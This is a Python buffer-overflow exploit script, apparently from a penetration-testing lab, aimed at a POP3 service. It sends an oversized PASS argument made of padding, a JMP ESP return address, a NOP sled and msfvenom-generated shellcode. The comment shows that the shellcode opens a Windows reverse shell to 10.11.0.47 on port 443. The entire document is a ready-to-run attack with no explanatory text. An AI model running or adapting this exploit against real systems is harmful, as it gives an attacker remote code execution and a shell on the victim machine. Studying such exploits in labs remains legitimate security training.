#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.47 LPORT=443-f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
# 5F4A358F   FFE4             JMP ESP
shellcode = ("\xbb\xd2\xf8\x92\x94\xda\xc1\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x52\x83\xc2\x04\x31\x5a\x0e\x03\x88\xf6\x70\x61\xd0\xef\xf7"
"\x8a\x28\xf0\x97\x03\xcd\xc1\x97\x70\x86\x72\x28\xf2\xca\x7e"
"\xc3\x56\xfe\xf5\xa1\x7e\xf1\xbe\x0c\x59\x3c\x3e\x3c\x99\x5f"
"\xbc\x3f\xce\xbf\xfd\x8f\x03\xbe\x3a\xed\xee\x92\x93\x79\x5c"
"\x02\x97\x34\x5d\xa9\xeb\xd9\xe5\x4e\xbb\xd8\xc4\xc1\xb7\x82"
"\xc6\xe0\x14\xbf\x4e\xfa\x79\xfa\x19\x71\x49\x70\x98\x53\x83"
"\x79\x37\x9a\x2b\x88\x49\xdb\x8c\x73\x3c\x15\xef\x0e\x47\xe2"
"\x8d\xd4\xc2\xf0\x36\x9e\x75\xdc\xc7\x73\xe3\x97\xc4\x38\x67"
"\xff\xc8\xbf\xa4\x74\xf4\x34\x4b\x5a\x7c\x0e\x68\x7e\x24\xd4"
"\x11\x27\x80\xbb\x2e\x37\x6b\x63\x8b\x3c\x86\x70\xa6\x1f\xcf"
"\xb5\x8b\x9f\x0f\xd2\x9c\xec\x3d\x7d\x37\x7a\x0e\xf6\x91\x7d"
"\x71\x2d\x65\x11\x8c\xce\x96\x38\x4b\x9a\xc6\x52\x7a\xa3\x8c"
"\xa2\x83\x76\x02\xf2\x2b\x29\xe3\xa2\x8b\x99\x8b\xa8\x03\xc5"
"\xac\xd3\xc9\x6e\x46\x2e\x9a\x9a\x9c\x30\x75\xf3\xa0\x30\x88"
"\xb8\x2c\xd6\xe0\xae\x78\x41\x9d\x57\x21\x19\x3c\x97\xff\x64"
"\x7e\x13\x0c\x99\x31\xd4\x79\x89\xa6\x14\x34\xf3\x61\x2a\xe2"
"\x9b\xee\xb9\x69\x5b\x78\xa2\x25\x0c\x2d\x14\x3c\xd8\xc3\x0f"
"\x96\xfe\x19\xc9\xd1\xba\xc5\x2a\xdf\x43\x8b\x17\xfb\x53\x55"
"\x97\x47\x07\x09\xce\x11\xf1\xef\xb8\xd3\xab\xb9\x17\xba\x3b"
"\x3f\x54\x7d\x3d\x40\xb1\x0b\xa1\xf1\x6c\x4a\xde\x3e\xf9\x5a"
"\xa7\x22\x99\xa5\x72\xe7\xa9\xef\xde\x4e\x22\xb6\x8b\xd2\x2f"
"\x49\x66\x10\x56\xca\x82\xe9\xad\xd2\xe7\xec\xea\x54\x14\x9d"
"\x63\x31\x1a\x32\x83\x10")

buffer = 'A' * 2606 + '\x8f\x35\x4a\x5f' + "\x90" * 8 + shellcode
         #(3500 - 2606 - 4)


try:
    print("\nSending evil buffer...")
    s.connect(('10.11.1.128', 110))
    data = s.recv(1024)
    s.send('USER root' + '\r\n')
    data2 = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')

    print('\nDone!')

except Exception as e:
    print(e)
    print('Could not connect to POP3')
